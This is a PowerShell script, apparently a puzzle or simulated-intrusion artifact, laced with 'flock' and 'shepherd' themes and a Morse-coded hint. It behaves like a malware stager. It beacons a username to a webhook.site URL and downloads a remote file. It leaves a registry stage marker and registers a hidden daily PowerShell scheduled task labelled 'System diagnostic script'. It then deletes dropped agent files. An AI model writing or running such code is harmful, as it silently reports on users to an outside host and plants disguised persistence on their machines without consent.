$folder = "C:\ProgramData\sysdiag"
if (-not (Test-Path $folder)) {
    New-Item -Path $folder -ItemType Directory | Out-Null
}

Invoke-WebRequest -Uri "https://webhook.site/e9ef4595-7848-4776-affc-48a3e01298b4?id=nbennett" -UseBasicParsing -ErrorAction SilentlyContinue

New-Item -Path "$folder\flock.cfg" -ItemType File -Force | Out-Null
Add-Content -Path "$folder\flock.cfg" -Value "status=active"
Add-Content -Path "$folder\flock.cfg" -Value "flock_id=1914"
Add-Content -Path "$folder\flock.cfg" -Value "note=internal operative compromised. seek the shepherd"

New-Item -Path "$folder\stage2.txt" -ItemType File -Force | Out-Null
Add-Content -Path "$folder\stage2.txt" -Value "Session=Active"
Add-Content -Path "$folder\stage2.txt" -Value "Operator=SYS_TESTOPS_1"
Add-Content -Path "$folder\stage2.txt" -Value "Hint=- .... . / .- ..- - .... --- .-. / .. ... / .... .. -.. -.. . -. / .. -. / .-. --- - .- - .. --- -. .-.-.- / - .... .. .-. - . . -. / - ..- .-. -. ... / ... .... --- ..- .-.. -.. / ... .... --- .-- / -.-- --- ..- / - .... . / ... .... . . .--. .-.-.-"

$img = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/shepherd.jpg"
Invoke-WebRequest -Uri $img -OutFile "$folder\shepherd.jpg" -UseBasicParsing -ErrorAction SilentlyContinue

$regPath = "HKCU:\Software\SystemMonitor"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name "Stage1" -Value "Completed" -PropertyType String -Force | Out-Null

$taskName = "DiagWatcher"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c Start-Sleep 5"
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "System diagnostic script" -User $env:USERNAME -RunLevel Limited -Force | Out-Null

Start-Sleep -Seconds 1
Remove-Item -Path "$folder\agent.bin" -ErrorAction SilentlyContinue
Remove-Item -Path "$folder\agent.ps1" -ErrorAction SilentlyContinue
